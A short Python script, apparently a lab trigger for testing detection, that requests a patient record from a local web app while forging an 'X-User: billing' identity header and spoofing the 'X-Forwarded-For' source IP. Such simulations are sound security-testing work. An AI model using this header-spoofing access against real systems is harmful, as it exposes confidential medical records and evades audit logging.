import argparse

import requests


def main():
    parser = argparse.ArgumentParser(description="Trigger unauthorized patient record access.")
    parser.add_argument("--url", default="http://localhost:5000")
    parser.add_argument("--source-ip", default="10.10.77.20")
    parser.add_argument("--patient-id", default="P-1001")
    args = parser.parse_args()

    response = requests.get(
        f"{args.url}/patients/{args.patient_id}",
        headers={"X-User": "billing", "X-Forwarded-For": args.source_ip},
        timeout=5,
    )
    print(f"status={response.status_code} body={response.text}")


if __name__ == "__main__":
    main()
